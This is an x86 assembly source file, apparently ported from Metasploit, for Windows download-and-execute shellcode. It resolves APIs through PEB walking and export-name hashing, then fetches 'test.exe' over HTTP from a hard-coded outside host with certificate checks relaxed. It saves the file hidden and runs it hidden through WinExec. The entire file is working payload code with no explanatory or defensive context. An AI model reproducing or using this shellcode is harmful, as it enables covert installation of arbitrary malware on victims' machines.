[BITS 32]


; ported from metasploit framework 
global _start

_start:

	cld 				; clear directions flag
	call start			; call start
api_call:
	pushad				; save registers
	mov ebp,esp 			; set ebp to become stack mointer
	xor edx,edx			
	mov edx,[fs:edx+0x30]		; edx = PEB
	mov edx,[edx+0x0C]		; edx = PEB->ldr
	mov edx,[edx+0x14]		; edx = PEB->ldrInMemoryInitOrder.flink
next_mod:
	mov esi,[edx+0x28]		; esi = Dll name Unicode
	push edx			; save postion in list for record
	mov edx,[edx+0x10]		; Get this DLL base addr
	mov eax,[edx+0x3c]		; jump over PE header
	mov eax,[edx+eax+0x78]		; eax = Dll Export address table RVA
	test eax,eax			; test EAT existance
	jz get_next_mod1		; if no EAT present jump to get next module 
	add eax,edx			; eax = &EAT
	push eax			; save our export address table
	mov ecx,[eax+0x18]		; load ecx with the number of functions in dll export table
	mov ebx,[eax+0x20]		; ebx =  RVA of Names Table
	add ebx,edx			; ebx = &NamesTable
get_next_func:
	jecxz get_next_mod		; if ecx is zero reached end of functions jump to get next module
	dec ecx				; dec ecx
	mov esi,[ebx+4*ecx]		; esi = RVA of function name ; ebx = &namestable ; ecx = current function name position
	add esi,edx			; esi = &functionname
	xor edi,edi			; to act as hash accumulator
	xor eax,eax			; to load bytes in
loop_funcname:
	lodsb				; load byte from esi into eax and inc esi
	test al,al			; test if last byte is NULL reached end of function name
	jz compute_hash_finished
	ror edi,0xd			; rotate edi 13 bits to the right
	add edi,eax
	jmp loop_funcname
compute_hash_finished:
	cmp edi,[ebp+0x24]		; compare computed hash with requested hash
	jnz get_next_func		; if no match get next function
	pop eax				; pop off current dll EAT
	mov ebx,[eax+0x24]		; ebx = RVA of ordinal table
	add ebx,edx			; ebx = &ordinaltable
	mov cx,[ebx+2*ecx]		; get current position in ordinal table
	mov ebx,[eax+0x1c]		; ebx = RVA of Function Address table
	add ebx,edx			; ebx = &AddressTable
	mov eax,[ebx+4*ecx]		; eax = RVA of function
	add eax,edx			; eax = &function
finish:
	mov [esp+0x20],eax		; mov &function to eax saved on stack from pushad 
	pop edx				; pop off current position in memoryorder list
	popad				; restore registers
	pop ecx				; pop off current return address
	pop edx				; pop off requested function hash
	push ecx			; push original caller address
	jmp eax				; jmp to function
get_next_mod:
	pop eax				; restore our current now previous EAT address
get_next_mod1:
	pop edx				; restore position in memory order list
	mov edx,[edx]			; get next dll
	jmp next_mod			; jump to parse dll
start:
	pop ebp 			; save address to api_call to ebp
; LoadLibraryA(wininet)
	push 0xff74656e			; Push the bytes 'wininet',0 onto the stack.
	push 0x696e6977 		; ...
	inc byte [esp+0x07]		; end string with null byte
	mov esi,esp			; save pointer of wininet to edx
	push esp			; push pointer to string on stack
	push 0xec0e4e8e			; push LoadLibraryA hash
	call ebp			; call LoadLibraryA(wininet)
;HINTERNET InternetOpen( _In_  LPCTSTR lpszAgent, _In_  DWORD dwAccessType, _In_  LPCTSTR lpszProxyName, _In_  LPCTSTR lpszProxyBypass, _In_  DWORD dwFlags);
;0x2944E857		InternetOpenA
	xor edi,edi			; zerout edi
	push edi			; dwflags = NULL
	push edi			; lpszProxyBypass = NULL
	push edi			; koszProxyName  = NULL
	push edi			; dwAccessType  = NULL
	push esi			; lpszAgent  = "WinInet\x00"		
	push 0x57E84429			; InternetOpenA hash
	call ebp			; call InternetOpenA("wininet\x00",NULL,NULL,NULL,NULL);

	jmp dbl_get_server_host		; jump to get server host

internetconnection:
;HINTERNET InternetConnect( _In_  HINTERNET hInternet, _In_  LPCTSTR lpszServerName, _In_  INTERNET_PORT nServerPort,  _In_  LPCTSTR lpszUsername, _In_  LPCTSTR lpszPassword, _In_  DWORD dwService, _In_  DWORD dwFlags, _In_  DWORD_PTR dwContext);
;INTERNET_SERVICE_HTTP	= 0x3
;INTERNET_SERVICE_HTTPS	= 0x3
;INTERNET_SERVICE_FTP	= 0x1
;0xEE84B1E		InternetConnectA
	pop ebx				; pop server_host to ebx
	xor ecx,ecx			
	push ecx			; dwContext = NUll
	push ecx			; dwflags = NULL
	inc ecx
	inc ecx
	inc ecx				; ecx =0x3
	push ecx				; dwservice = ecx = 0x3 + INTERNET_SERVICE_HTTP/HTTPS
	xor ecx,ecx
	push ecx			; lpszPassword = NULL
	push ecx			; lpszUsername = NULL
	mov cl,0x50			; nServerPort = 80 = 50h
	push ecx
	push ebx			; LpszServerName = ebx = HOST_NAME
	push eax			; push hinternet handle returned by InternetOpenA 	
	push 0x1E4bE80E			; push InternetConnectA hash
	call ebp			; call internetconnectA(hinternet,server_host,80,null,null,INTERNET_SERVICE_HTTP,null,null)

	jmp dbl_get_server_uri

httpopenrequest:
;HINTERNET HttpOpenRequest(_In_  HINTERNET hConnect, _In_  LPCTSTR lpszVerb, _In_  LPCTSTR lpszObjectName,  _In_  LPCTSTR lpszVersion,  _In_  LPCTSTR lpszReferer,  _In_  LPCTSTR *lplpszAcceptTypes,  _In_  DWORD dwFlags,  _In_  DWORD_PTR dwContext);
;0x80000000 = INTERNET_FLAG_RELOAD
;0x04000000 = INTERNET_NO_CACHE_WRITE
;0x00800000 = INTERNET_FLAG_SECURE		// https only
;0x00200000 = INTERNET_FLAG_NO_AUTO_REDIRECT 
;0x00001000 = INTERNET_FLAG_IGNORE_CERT_CN_INVALID
;0x00002000 = INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
;0x00000200 = INTERNET_FLAG_NO_UI
;add the above Flag dwords to get the last flag bits 
;0x9F76DEF7		HttpOpenRequestA
	pop ecx				; server uri address saved to ecx
	xor edx,edx			
	push edx			; dwContext = NULL
	push 0x84203200			; dword dwflags = sum of flags dwords above
	push edx			; lpsz AcceptTypes = NULL
	push edx			; lpszReferer = NULL 	
	push edx			; lpszVersion = NULL
	push ecx			; lpszObjectname = server uri
	push edx			; lpszVerb = NULL
	push eax			; hconnect returned from internetconnectA
	push 0xF7DE769F			; push HttpOpenRequestA hash
	call ebp			; call HttpOpenRequestA(hconnect,null,server_uri,null,null,null,dwflags,null);
	mov esi,eax			; mov returned hhttprequest handle to esi

set_rety:
	xor ebx,ebx			; zero out ebx
	mov bl,0x10			; set retry count
internetsetoption:
;BOOL InternetSetOption(_In_  HINTERNET hInternet,_In_  DWORD dwOption,_In_  LPVOID lpBuffer,_In_  DWORD dwBufferLength);
;INTERNET_OPTION_SECURITY_FLAGS = 31
;0xDA0EFF5		InternetSetOptionA
	push dword 0x3380
	mov eax,esp			; set pointer to buffer in eax
	xor ecx,ecx
	mov cl,0x04			; dwbufferlength = sizeof(dwflags) 
	push ecx			; ...
	push eax			; lpbuffer = &dwflags
	push 31				; dwOption = 31
					; dwOption  INTERNET_OPTION_SECURITY_FLAG 
	push esi			; hhttpreuest handler returned by httprequestA
	push 0xF5EFA00D			; InternSetOptionA	hash
	call ebp			; InternetSetOptionA(hhttprequest,INTERNET_OPTION_SECURITY_FLAG,&dwflags,dwbufferlength)

http_send_request:
;BOOL HttpSendRequest( _In_  HINTERNET hRequest, _In_  LPCTSTR lpszHeaders, _In_  DWORD dwHeadersLength, _In_  LPVOID lpOptional,_In_  DWORD dwOptionalLength);
;0x9DBEE62D		HttpSendRequestA
	xor edx,edx
	push edx			; dwOptionallength = 0
	push edx			; lpOptional = NULL
	push edx			; dwHeadersLength = 0
	push edx			; lpszHeaders = NULL
	push esi			; hrequest = hhttprequest handle returned by httpopenrequestA 
	push 0x2DE6BE9D			; HttpSendRequestA hash
	call ebp			; HttpSendRequestA(hhttprequest,null,null,null,null)
	test eax,eax			; see if NULL returned
	jnz create_file2		; jump if not zero to create file
try_it_again:
	dec ebx 			; decrease retry counter ebx
	jz exit				; if ebx = 0 jump exit
	jmp internetsetoption		; if ebx != 0 try again from internetsetoption
create_file2:	
	jmp get_filename

create_file:
;HANDLE WINAPI CreateFile( _In_      LPCTSTR lpFileName, _In_      DWORD dwDesiredAccess, _In_      DWORD dwShareMode, _In_opt_  LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_      DWORD dwCreationDisposition, _In_      DWORD dwFlagsAndAttributes, _In_opt_  HANDLE hTemplateFile);
;0xA517007C CreateFileA
	xor eax,eax
	pop edi				; save pointer to file name in edi
	push eax			;htemplateFile = NULL
	inc eax
	inc eax				; eax = 2
	push eax			; dwflagsandattributes = 02 Hidden
	push eax			; dwcreationDisposition = CreateAlways 02
	xor ecx,ecx
	push ecx			; lpsecurityattributes = NULl
	push eax			; dwShareMode = FILE_SHARE_WRITE
	push eax			; dwdesiredaccess = GENERIC_EXECUTE= 02
	push edi			; address of file name
	push 0x7C0017A5			; hash of CreatefileA
	call ebp			; CreateFileA(filename,GENERIC_EXECUTE,FILE_SHARE_WRITE,null,CreateAlways,Hidden,null)

download_prep:
	xchg eax,ebx			;put file handle in ebx
	xor eax,eax			
	add ax,0x304			;eax = 300 bytes		
	sub esp,eax			; make space on stack for buffer

InternetReadFile:
;BOOL InternetReadFile( _In_   HINTERNET hFile, _Out_  LPVOID lpBuffer, _In_   DWORD dwNumberOfBytesToRead, _Out_  LPDWORD lpdwNumberOfBytesRead);
;0x8B4BE35F		InternetReadFile
	
	push esp			; Numberofbytesread = &buffer recieves data from internetReadFile call
	lea ecx,[esp+0x08]		; buffer to readinto
	xor eax,eax
	mov ah,0x03			; eax = 0x300 ; numberofbytestoread
	push eax			; NumberOfBytesToRead = 300
	push ecx			; &lpbuffer to read into
	push esi			; hrequest handle returned by HttpRequestOpenA
	push 0x5FE34B8B			; push InternetReadFile hash
	call ebp			; InternetReadFile(hfile,&buffer,300,* for numberofbytesread)
	
	test eax,eax			; download failed ?
	jz exit				; exit and run main app
	
	pop eax				; number of bytes read
	
	test eax,eax			; optional?
	je close_handle			; continue until it returns 0
 
Writetofile:
;BOOL WINAPI WriteFile( _In_         HANDLE hFile, _In_         LPCVOID lpBuffer, _In_         DWORD nNumberOfBytesToWrite, _Out_opt_    LPDWORD lpNumberOfBytesWritten, _Inout_opt_  LPOVERLAPPED lpOverlapped);
;0x1F790AE8		WriteFile	

	xor ecx,ecx
	push ecx			; lpOverlapped = NULL
	push esp			; numberofbyteswritten recievs data from WriteFile call
	push eax			; numberofbytestowrite
	lea ecx,[esp+0xc]		; ecx = &ofbuffer
	push ecx			; lpBuffer = &buffer to read from
	push ebx			; hfile = file handle returned by createfile and saved in ebx
	push 0xE80A791F			; push WriteFile hash
	call ebp			; WriteFile(hfile,&buffer,eax,esp,null)
	
	xor edx,edx
	add dl,0x04
	sub esp,edx
	;pop edx	
	jmp InternetReadFile
close_handle:
;0xFB97FD0F		CloseHandle
	push ebx			; handle to close in this case file handle
	push 0x0FFD97FB			; CloseHandle hash
	call ebp			; CloseHandle(hfile)

execute_file:
;UINT WINAPI WinExec( _In_  LPCSTR lpCmdLine, _In_  UINT uCmdShow);		
;WinExec   0x98FE8A0E

	xor eax,eax
	push eax		; cmdshow = NULL = hidden
	push edi		; filename is the cmd to execute
	push 0x0E8AFE98		; WinExec Hash
	call ebp		; WinExec("filename",hidden)
jmp exit
 
dbl_get_server_uri:
	jmp get_server_uri
dbl_get_server_host:
	jmp get_server_host
get_server_host:
	call internetconnection		; call internetconnection
server_host:
	db "www.elsherei.com",0x00
get_server_uri:
	call httpopenrequest
	db "test.exe",0x00
get_filename:
	call create_file
	db "test.exe",0x00
exit:
